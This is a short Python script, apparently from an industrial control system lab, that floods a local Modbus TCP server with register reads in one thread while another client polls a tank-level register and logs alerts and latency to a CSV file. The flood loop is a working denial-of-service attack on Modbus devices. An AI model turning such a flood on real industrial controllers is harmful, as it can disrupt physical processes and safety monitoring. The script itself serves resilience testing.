from pymodbus.client import ModbusTcpClient
import time, datetime, csv, threading

monitor_client = ModbusTcpClient('localhost', port=5021)
monitor_client.connect()

flood_client = ModbusTcpClient('localhost', port=5021)
flood_client.connect()

stop_flag = {'stop': False}
flood_count = {'n': 0}

def flood():
    while not stop_flag['stop']:
        try:
            flood_client.read_holding_registers(0, count=1, device_id=1)
            flood_count['n'] += 1
        except Exception:
            pass

monitor_client.write_coil(9, True, device_id=1)

flood_thread = threading.Thread(target=flood)
flood_thread.start()
print(f"=== DOS ATTACK + MONITOR START: {datetime.datetime.utcnow().isoformat()} ===")

log_file = open('dos_phase4_log.csv', 'a', newline='')
writer = csv.writer(log_file)

alert_count, poll_count, error_count = 0, 0, 0
start = time.time()
duration = 60
THRESHOLD_HIGH, THRESHOLD_LOW = 90, 15

while time.time() - start < duration:
    t0 = time.perf_counter()
    try:
        r = monitor_client.read_holding_registers(0, count=1, device_id=1)
        level = r.registers[0]
        latency = (time.perf_counter() - t0) * 1000
        poll_count += 1
        if level >= THRESHOLD_HIGH or level <= THRESHOLD_LOW:
            ts = datetime.datetime.utcnow().isoformat()
            writer.writerow([ts, level, latency, 'ALERT'])
            log_file.flush()
            alert_count += 1
            print(f"[ALERT] {ts} level={level} latency={latency:.2f}ms")
    except Exception as e:
        error_count += 1
        print(f"MONITOR poll error: {e}")
    time.sleep(0.2)

stop_flag['stop'] = True
flood_thread.join()

print(f"=== DOS ATTACK + MONITOR END: {datetime.datetime.utcnow().isoformat()} ===")
print(f"Monitor: polls={poll_count} alerts={alert_count} errors={error_count}")
print(f"Flood requests sent: {flood_count['n']} ({flood_count['n']/duration:.1f} req/sec)")

log_file.close()
monitor_client.close()
flood_client.close()
